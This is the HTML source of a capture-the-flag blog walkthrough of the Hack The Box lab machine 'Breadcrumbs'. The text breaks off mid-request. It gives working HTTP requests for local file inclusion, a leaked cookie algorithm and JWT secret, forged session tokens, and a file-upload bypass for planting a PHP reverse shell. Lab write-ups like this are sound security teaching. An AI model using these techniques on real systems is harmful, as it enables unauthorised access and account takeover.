@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	20 Feb 2021IP:	10.10.10.228">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[Breadcrumbs]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/02/23/breadcrumbs/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	20 Feb 2021IP:	10.10.10.228">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb188.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb189.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb190.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb191.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb192.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb193.jpg">
+<meta property="article:published_time" content="2021-02-23T12:52:12.000Z">
+<meta property="article:modified_time" content="2021-07-20T13:18:18.589Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb188.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/02/23/breadcrumbs/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/02/23/breadcrumbs/","path":"2021/02/23/breadcrumbs/","title":"Hack-The-Box-walkthrough[Breadcrumbs]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[Breadcrumbs] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-number">3.</span> <span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-user"><span class="nav-number">4.</span> <span class="nav-text">get user</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-administrator"><span class="nav-number">5.</span> <span class="nav-text">get administrator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Development"><span class="nav-number">6.</span> <span class="nav-text">Development</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Krypter-Linux"><span class="nav-number">7.</span> <span class="nav-text">Krypter_Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">8.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">9.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/23/breadcrumbs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[Breadcrumbs] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[Breadcrumbs]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-02-23 20:52:12" itemprop="dateCreated datePublished" datetime="2021-02-23T20:52:12+08:00">2021-02-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-07-20 21:18:18" itemprop="dateModified" datetime="2021-07-20T21:18:18+08:00">2021-07-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Windows<br>Difficulty:	Hard<br>Points:	40<br>Release:	20 Feb 2021<br>IP:	10.10.10.228</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb188.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.228</span></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>h PHP/<span class="number">8.0</span>.<span class="number">1</span>)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/http      Apache httpd <span class="number">2.4</span>.<span class="number">46</span> ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>h PHP/<span class="number">8.0</span>.<span class="number">1</span>)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">3306</span>/tcp  open  mysql?</span><br><span class="line"><span class="number">5040</span>/tcp  open  unknown</span><br><span class="line"><span class="number">7680</span>/tcp  open  pando-pub?</span><br><span class="line"><span class="number">49664</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49665</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49666</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49667</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49668</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49669</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=<span class="number">7.91</span>%I=<span class="number">7</span>%D=<span class="number">2</span>/<span class="number">23</span>%Time=<span class="number">6034</span>FA27%P=x86_64-pc-linux-gnu%r(RP</span><br><span class="line">SF:CCheck,<span class="number">4</span>A,&quot;F\<span class="number">0</span>\<span class="number">0</span>\x01\xffj\x04Host\x20&#x27;<span class="number">10</span>\.<span class="number">10</span>\.<span class="number">14</span>\.<span class="number">12</span>&#x27;\x20is\x20not\x20a</span><br><span class="line">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(X11Probe</span><br><span class="line">SF:,<span class="number">4</span>A,&quot;F\<span class="number">0</span>\<span class="number">0</span>\x01\xffj\x04Host\x20&#x27;<span class="number">10</span>\.<span class="number">10</span>\.<span class="number">14</span>\.<span class="number">12</span>&#x27;\x20is\x20not\x20allowed</span><br><span class="line">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Lfi on books page by and making a post request to search a book, change request and change method variable to 1 and remove title and author and replace with book</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /includes/bookController.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.10.10.228</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=480ifp24jq5q4l14mepp0cgkif</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book=../index.php&amp;method=1</span><br></pre></td></tr></table></figure>
+
+<p>Use read files<br>Find secret key for tokens and php for how cookie are made by looking at files for the portal sign</p>
+<p>Read code for cookie. The phpsessid is created by md5 hashing string that has a random letter from the users name</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /includes/bookController.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.10.10.228</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=480ifp24jq5q4l14mepp0cgkif</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book=../portal/cookie.php&amp;method=1</span><br></pre></td></tr></table></figure>
+
+<p>response</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&lt;?php\r\n\/**\r\n * @param string <span class="variable">$username</span>  Username requesting session cookie\r\n * \r\n * @return string <span class="variable">$session_cookie</span> Returns the generated cookie\r\n * \r\n * @devteam\r\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\r\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\r\n * *\/\r\nfunction makesession(<span class="variable">$username</span>)&#123;\r\n    <span class="variable">$max</span> = strlen(<span class="variable">$username</span>) - 1;\r\n    <span class="variable">$seed</span> = rand(0, <span class="variable">$max</span>);\r\n    <span class="variable">$key</span> = \&quot;s4lTy_stR1nG_\&quot;.<span class="variable">$username</span>[<span class="variable">$seed</span>].\&quot;(!528.\/9890\&quot;;\r\n    <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);\r\n\r\n    return <span class="variable">$session_cookie</span>;\r\n&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Get Paul phpsessid</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure>
+
+<p>get secret key</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /includes/bookController.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.10.10.228</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=480ifp24jq5q4l14mepp0cgkif</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book=../portal/authController.php&amp;method=1</span><br></pre></td></tr></table></figure>
+
+<p>got secret key in response</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>create a new jwt token using the secret key you found now token is</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</span><br></pre></td></tr></table></figure>
+
+<p>Login portal with a random account, edit your cookies with the tokens refresh</p>
+<p>Now Paul</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb189.jpg"></li>
+</ul>
+<h3 id="get-user"><a href="#get-user" class="headerlink" title="get user"></a>get user</h3><p>Go to file management and upload a php script in a file (maybe like reverseshell.html) and intercept with burpsuite  and change the .zip at the bottom to .php if not work out title and author in like valid book <span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjIyOC9ib29rcw==">http://10.10.10.228/books<i class="fa fa-external-link-alt"></i></span></p>
+<p>due to upload button not working, view the following page to makeup file upload request package by yourself.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.228/portal/assets/js/files.js</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">POST /portal/includes/fileController.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 10.10.10.228</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line"></span><br><span class="line">Content-Length: 295</span><br><span class="line"></span><br><span 